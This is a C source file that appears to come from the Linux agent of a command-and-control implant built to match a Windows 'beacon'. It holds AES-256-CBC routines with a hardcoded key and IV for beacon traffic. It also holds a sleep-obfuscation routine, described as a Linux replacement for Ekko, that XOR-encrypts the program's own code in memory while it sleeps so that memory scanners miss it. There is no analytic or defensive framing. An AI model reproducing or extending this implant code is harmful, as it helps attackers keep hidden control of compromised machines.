// linux-agent/src/crypto_linux.c
#include "crypto_linux.h"
#include <openssl/evp.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdint.h>

// Hardcoded AES-256-CBC key and IV (must match Windows beacon)
static unsigned char aes_key[32] = {
    0x3E, 0x31, 0xF4, 0x00, 0x50, 0xB6, 0x6E, 0xB8,
    0xF6, 0x98, 0x95, 0x27, 0x43, 0x27, 0xC0, 0x55,
    0xEB, 0xDB, 0xE1, 0x7F, 0x05, 0xFE, 0x65, 0x6D,
    0x0F, 0xA6, 0x5B, 0x00, 0x33, 0xE6, 0xD9, 0x0B
};
static unsigned char aes_iv[16] = {
    0xB4, 0xC8, 0x1D, 0x1D, 0x14, 0x7C, 0xCB, 0xFA,
    0x07, 0x42, 0xD9, 0xED, 0x1A, 0x86, 0xD9, 0xCD
};

int aes_encrypt_linux(const unsigned char* plain, size_t plain_len,
                      const unsigned char* key, const unsigned char* iv,
                      unsigned char** cipher_out, size_t* cipher_len) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return -1;

    if (!key) key = aes_key;
    if (!iv)  iv = aes_iv;

    unsigned char* out = malloc(plain_len + EVP_MAX_BLOCK_LENGTH);
    if (!out) { EVP_CIPHER_CTX_free(ctx); return -1; }

    int len = 0, total = 0;
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
    EVP_EncryptUpdate(ctx, out, &len, plain, (int)plain_len);
    total = len;
    EVP_EncryptFinal_ex(ctx, out + len, &len);
    total += len;

    EVP_CIPHER_CTX_free(ctx);
    *cipher_out = out;
    *cipher_len = (size_t)total;
    return 0;
}

int aes_decrypt_linux(const unsigned char* cipher, size_t cipher_len,
                      const unsigned char* key, const unsigned char* iv,
                      unsigned char** plain_out, size_t* plain_len) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return -1;

    if (!key) key = aes_key;
    if (!iv)  iv = aes_iv;

    unsigned char* out = malloc(cipher_len + EVP_MAX_BLOCK_LENGTH);
    if (!out) { EVP_CIPHER_CTX_free(ctx); return -1; }

    int len = 0, total = 0;
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
    EVP_DecryptUpdate(ctx, out, &len, cipher, (int)cipher_len);
    total = len;
    EVP_DecryptFinal_ex(ctx, out + len, &len);
    total += len;

    EVP_CIPHER_CTX_free(ctx);
    *plain_out = out;
    *plain_len = (size_t)total;
    return 0;
}

// -- Sleep obfuscation (replaces Ekko on Linux) -----------------------
// XOR key for in-memory obfuscation during sleep
static uint8_t sleep_key[16] = {
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
    0x13, 0x37, 0xC0, 0xDE, 0xF0, 0x0D, 0xAB, 0xCD
};

extern char __executable_start; // linker symbol
extern char _etext;

void obf_sleep_linux(unsigned int ms) {
    void* base = (void*)&__executable_start;
    size_t size = (size_t)(&_etext - &__executable_start);

    // page align
    size_t pg = sysconf(_SC_PAGESIZE);
    size = (size + pg - 1) & ~(pg - 1);

    // make .text writable
    mprotect(base, size, PROT_READ | PROT_WRITE);

    // XOR encrypt
    uint8_t* p = (uint8_t*)base;
    for (size_t i = 0; i < size; i++)
        p[i] ^= sleep_key[i % 16];

    // sleep -- image is garbage in memory
    usleep(ms * 1000);

    // XOR decrypt (same key = symmetric)
    for (size_t i = 0; i < size; i++)
        p[i] ^= sleep_key[i % 16];

    // restore RX
    mprotect(base, size, PROT_READ | PROT_EXEC);
}
